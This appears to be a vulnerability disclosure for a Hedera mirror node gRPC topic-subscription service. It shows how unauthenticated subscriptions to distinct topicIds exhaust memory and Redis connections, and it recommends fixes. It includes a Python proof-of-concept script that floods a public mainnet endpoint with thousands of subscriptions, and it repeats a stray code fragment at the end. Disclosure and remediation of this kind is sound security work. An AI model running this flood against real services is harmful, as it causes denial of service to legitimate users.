### Title
Unbounded ConcurrentHashMap Growth via Unauthenticated Distinct-TopicId Subscriptions Causes gRPC Service Resource Exhaustion

### Summary
`RedisTopicListener.getSharedListener()` inserts one entry into `topicMessages` per distinct `topicId` with no upper bound, and each entry holds an open Redis pub/sub channel subscription for the lifetime of the last connected subscriber. Because the gRPC service requires no authentication and imposes no limit on the total number of inbound connections, an unprivileged attacker can open arbitrarily many connections—each subscribing to a unique `topicId`—causing the map and Redis subscription pool to grow without bound, exhausting JVM heap and Redis connection resources and crashing the service.

### Finding Description

**Exact code path:**

`getSharedListener()` (line 61) calls `computeIfAbsent` on the unbounded `ConcurrentHashMap`:

```java
// RedisTopicListener.java line 61
return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
``` [1](#0-0) 

`subscribe()` (lines 68–80) creates a new Redis pub/sub channel subscription per distinct topic and keeps it alive via `.share()`:

```java
return container
    .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
    ...
    .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
    .share();
``` [2](#0-1) 

The `unsubscribe()` cleanup only fires when the **last** subscriber to a given topic disconnects: [3](#0-2) 

**Root cause — three compounding failures:**

1. **No cap on `topicMessages` map size.** The map is a plain `ConcurrentHashMap` with no `maximumSize` or eviction policy. One entry (+ one Redis subscription) is created per distinct `topicId` and persists until all subscribers for that topic disconnect. [4](#0-3) 

2. **No total-connection limit.** `GrpcConfiguration` only configures `maxConcurrentCallsPerConnection = 5`; it sets no `maxConnectionAge`, no total connection cap, and no IP-based connection throttle. An attacker opens N connections × 5 calls = 5N concurrent subscriptions to 5N distinct topics. [5](#0-4) 

3. **No authentication.** The only registered `ServerInterceptor` (`GrpcInterceptor`) sets a table-usage context and passes the call through unconditionally — no credential check, no IP allowlist. [6](#0-5) 

**Per-subscriber memory amplifier:** `SharedTopicListener.listen()` applies `onBackpressureBuffer(maxBufferSize = 16 384)` to every subscriber. With thousands of subscribers each holding a 16 384-slot buffer, heap pressure compounds rapidly. [7](#0-6) 

**Infinite retry aggravates the condition:** `Retry.backoff(Long.MAX_VALUE, ...)` means a failing Redis subscription retries forever, holding the map entry and spawning new connection attempts indefinitely. [8](#0-7) 

### Impact Explanation
Each distinct `topicId` subscription consumes: one `ConcurrentHashMap` entry, one Redis pub/sub channel (a file descriptor + Redis server-side memory), and up to 16 384 buffered `TopicMessage` objects per downstream subscriber. Exhausting Redis pub/sub connections causes all new and existing subscriptions to fail. Exhausting JVM heap triggers OOM and crashes the gRPC process. Either outcome causes legitimate payment-confirmation subscribers to miss `TopicMessage` events, which in a financial settlement context constitutes a direct loss of funds for parties relying on on-chain confirmation signals.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no prior access. The Hedera gRPC topic-subscription API is publicly documented. An attacker needs only a script that opens TCP connections and sends `subscribeTopic` RPCs with incrementing `topicId` values. The `maxConcurrentCallsPerConnection = 5` guard is trivially bypassed by opening more connections. The attack is repeatable and can be sustained indefinitely because the retry loop keeps dead entries alive.

### Recommendation
1. **Cap the `topicMessages` map.** Replace `ConcurrentHashMap` with a size-bounded structure (e.g., Caffeine `Cache` with a `maximumSize`) so that the number of concurrent Redis subscriptions is bounded regardless of attacker input.
2. **Limit total inbound connections.** In `GrpcConfiguration`, add `serverBuilder.maxConnectionAge(...)` and consider a Netty `ChannelOption` for total connection count, or front the service with an API gateway that enforces per-IP connection limits.
3. **Add authentication/authorization.** Require a valid bearer token or mTLS certificate before accepting any `subscribeTopic` call.
4. **Bound the retry loop.** Replace `Long.MAX_VALUE` with a finite retry count in `subscribe()` so that a poisoned topic entry eventually evicts itself.
5. **Rate-limit subscription creation.** Apply a token-bucket rate limiter (analogous to the `web3` module's `ThrottleConfiguration`) at the gRPC service layer to cap the rate at which new topic subscriptions can be opened per IP.

### Proof of Concept
```python
import grpc, threading, itertools
# pip install grpcio hedera-mirror-node-proto (or generate stubs from protobuf)
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror.mainnet.hedera.com:443"  # or self-hosted instance

def flood(start_topic, count):
    channel = grpc.insecure_channel(TARGET)   # no credentials needed
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for topic_id in range(start_topic, start_topic + count):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topicID=...,   # set shard=0, realm=0, topic=topic_id
            consensusStartTime=Timestamp(seconds=0, nanos=0),
        )
        # Non-blocking: fire and forget, keep channel open
        threading.Thread(target=lambda r=req: list(stub.subscribeTopic(r)), daemon=True).start()

# Open 1000 connections × 5 calls each = 5000 distinct topicId entries in topicMessages
for i in range(1000):
    threading.Thread(target=flood, args=(i * 5, 5), daemon=True).start()

input("Attack running — observe gRPC pod OOM / Redis connection exhaustion")
```

Each thread holds its gRPC connection open, keeping the corresponding `topicMessages` entries and Redis subscriptions alive. After ~thousands of distinct topics, Redis pub/sub connection limits or JVM heap is exhausted, crashing the service and dropping all legitimate subscribers.

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```
